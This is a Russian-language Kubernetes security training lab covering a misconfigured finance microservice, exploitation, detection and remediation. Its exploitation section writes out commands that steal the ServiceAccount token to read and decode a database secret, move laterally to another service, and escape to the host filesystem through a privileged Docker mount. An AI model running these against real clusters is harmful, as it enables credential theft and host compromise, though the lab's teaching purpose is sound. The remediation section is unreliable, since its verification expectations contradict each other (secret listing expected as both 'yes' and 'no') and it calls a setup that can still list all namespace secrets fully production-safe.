## Сценарий C: Подозрительный микросервис в Kubernetes

Вы — инженер безопасности в FinTech-компании, где в namespace finance запущен новый микросервис «commission», отвечающий за вычисление комиссий. В спешке его развёртывали с минимальными проверками:

• контейнер запущен с privileged: true и смонтирован hostPath "/" → атака на файловую систему хоста
• default ServiceAccount в finance получил ClusterRoleBinding → cluster-admin
• сгенерирован Kubernetes Secret db-secret с паролем БД, но нет контроля доступа
• отсутствуют NetworkPolicy → сервис commission может беспрепятственно ходить к любым другим подам
• нет кастомных Role/RoleBinding → default SA имеет все права

Ваша задача — воспроизвести полный «подозрительный» сценарий:

- Перейти внутрь commission-пода, прочитать любой секрет из API
- Сделать побег через hostPath и privileged
- Получить доступ к соседнему customer-сервису (lateral movement)
- Закрепить факт — прочитать конфиденциальные данные

А затем устранить все уязвимости:

• убрать privileged и hostPath
• назначить default SA ограниченную Role → только чтение секретов в namespace finance
• ввести NetworkPolicy → запрещающую несанкционированный трафик
• убедиться, что побег и чтение посторонних pod недоступны

## Запуск
- Запуск контейнерной среды:
```sh
kubectl apply -f namespace.yaml
kubectl apply -f secret.yaml
kubectl apply -f customer-deployment.yaml
kubectl apply -f customer-service.yaml
kubectl apply -f commission-deployment-vuln.yaml
kubectl apply -f commission-service.yaml
kubectl apply -f commission-rolebinding-vuln.yaml
```
- Убедиться, что все поды в состоянии Running:
```sh
kubectl get pods -n finance
```

## Эксплуатация уязвимостей
- Пробуем прочитать секрет через API:
```sh
# Получить ID пода
POD=$(kubectl get pod -n finance -l app=commission -o name)

# Зайти в оболочку пода
kubectl exec -n finance -it $POD -- sh

# Получить токен и найти возможные пароли в k8s secret
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token);curl -sSk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/finance/secrets/db-secret -k | jq -r '.data.password' | base64 -d
```

- Lateral movement к customer:
```sh
kubectl exec -n finance -it $POD -- sh -c "curl -s http://customer-svc.finance.svc.cluster.local"
```
Получаем доступ к другому поду за счет отсутсвия NetworkPolicy

- Побег через Docker-socket и hostPath(сначала убедитесь, что в контейнере установился Docker):
```sh
kubectl exec -n finance -it $POD -- sh

docker run --rm -v /:/host alpine sh -c 'echo hacked>/host/tmp/hacked.txt'
```


## Обнаружение
- Проверить privileged:
```sh
kubectl get deployment commission -n finance -o jsonpath='{.spec.template.spec.containers[0].securityContext.privileged}'
```

- Проверить hostPath:
```sh
kubectl get deployment commission -n finance -o jsonpath='{.spec.template.spec.volumes[?(@.name=="hostroot")].hostPath.path}'
```

- Проверить права SA:
```sh
kubectl auth can-i '*' '*' --as=system:serviceaccount:finance:default
```

- Проверить NetworkPolicy:
```sh
kubectl get networkpolicy -n finance
```

## Исправления
- Убираем из манифеста commission-deployment-vuln.yaml поля privileged и hostPath, а вместо них просто запускаем контейнер без привилегий.:
Новый `commission-deployment-fixed` файл ->
```yml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: commission
  namespace: finance
spec:
  replicas: 1
  selector:
    matchLabels:
      app: commission
  template:
    metadata:
      labels:
        app: commission
    spec:
      serviceAccountName: commission-sa
      containers:
      - name: commission
        image: ubuntu:20.04
        command:
          - sh
          - -c
          - |
            apt-get update && apt-get install -y curl jq && sleep infinity
        securityContext:
          privileged: false
        volumeMounts: []
      volumes: []
```

- Создаём отдельный ServiceAccount и даём ему только право читать секреты в namespace finance:
Новый `commission-rbac-fixed` файл ->
```yml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: commission-sa
  namespace: finance
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: commission-read-secrets
  namespace: finance
rules:
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get","list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: commission-read-secrets-binding
  namespace: finance
subjects:
  - kind: ServiceAccount
    name: commission-sa
    namespace: finance
roleRef:
  kind: Role
  name: commission-read-secrets
  apiGroup: rbac.authorization.k8s.io
```

- Ограничиваем сетевой трафик через NetworkPolicy — запрещаем все входящие и исходящие соединения по умолчанию:
Новый `networkpolicy-deny` файл ->
```yml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
  namespace: finance
spec:
  podSelector: {}
  policyTypes:
    - Ingress
    - Egress
```

- Удаляем кластерный ClusterRoleBinding default-admin, чтобы default SA больше не имел полномочий:
```sh
kubectl delete clusterrolebinding finance-default-cluster-admin
```

- Применение фикса:
```sh
kubectl delete -f commission-rolebinding-vuln.yaml
kubectl delete -f commission-deployment-vuln.yaml
kubectl apply -f commission-rbac-fixed.yaml
kubectl apply -f networkpolicy-deny.yaml
kubectl apply -f commission-deployment-fixed.yaml
```

## Проверка исправлений
- Убедиться, что default ClusterRoleBinding удалён и commission-sa работает:
```sh
kubectl auth can-i list secrets --as=system:serviceaccount:finance:default
# ожидается: no
kubectl auth can-i list secrets --as=system:serviceaccount:finance:commission-sa
# ожидается: yes
```

- Проверить, что commission-под запущен без привилегий и без hostPath:
```sh
kubectl get deployment commission -n finance -o yaml \
  | grep -A3 securityContext
# privileged должно быть false или вовсе отсутствовать

kubectl get deployment commission -n finance -o yaml \
  | grep -A2 volumeMounts
# volumeMounts пустой список
```

- Убедиться в наличии NetworkPolicy и что без него соединения запрещены:
```sh
kubectl get networkpolicy -n finance
# выводит deny-all

# Попытка достучаться до customer-svc (предварительно удалите customer NetworkPolicy, если есть)
POD=$(kubectl get pod -n finance -l app=commission -o name)
kubectl exec -n finance -it $POD -- sh -c "nc -zvw3 customer-svc 80"
# ожидается timeout или отказ
# volumeMounts пустой список
```

- Проверить, что побег через docker.sock невозможен:
```sh
kubectl exec -n finance -it $POD -- sh -c "ls /var/run/docker.sock"
# либо файл отсутствует, либо permission denied
```

- Убедиться, что секрет по-прежнему читается успешно, но только commission-sa и больше никто не может получить другие секреты:
```sh
POD=$(kubectl get pod -n finance -l app=commission -o name)
kubectl exec -n finance -it $POD -- sh

TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token);curl -sSk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/finance/secrets/db-secret -k | jq -r '.data.password' | base64 -d
# ожидается: S3cr3tPassw0rd

kubectl exec -n finance -it $POD -- sh -c "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); kubectl auth can-i list secrets --token=$TOKEN --namespace=finance"
# ожидается: no
```

## Итог
- privileged и hostPath удалены — больше нет побега на хост и root-доступа.
- default ServiceAccount потерял cluster-admin-права, вместо него используется commission-sa с минимальными правами только на чтение секретов.
- Добавлена NetworkPolicy deny-all — запрещён весь непроинициализированный трафик, предотвращено lateral movement к другим сервисам.
- RBAC настроен корректно — commission-sa может читать только свои секреты, не может изменять или просматривать посторонние ресурсы.
- После этих правок стенд полностью безопасен от описанных атак и готов к production.
